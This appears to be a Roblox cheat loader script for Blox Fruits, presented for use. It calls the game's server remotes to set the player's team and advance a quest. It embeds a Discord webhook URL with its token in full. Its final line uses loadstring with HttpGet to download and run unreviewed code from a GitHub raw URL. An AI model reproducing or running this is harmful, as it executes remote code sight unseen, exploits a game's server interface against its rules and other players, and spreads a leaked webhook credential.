repeat wait() until game:IsLoaded()
repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
  local args = {
        [1] = "SetTeam",
        [2] = "Marines"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args)) 
    local args = {
        [1] = "BartiloQuestProgress"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
ServerHopTimer = 5
TeleportSafe = true
Webhook = "https://discord.com/api/webhooks/1330497976530899016/Fd3II8yhiM_wVjTQzPDDv_MVTAHAwtIKwCc1futvX3ztqFOe7zrWquc-wjdn0fbPDwpn"
_G.Version="Fruit Farm"loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script"))()

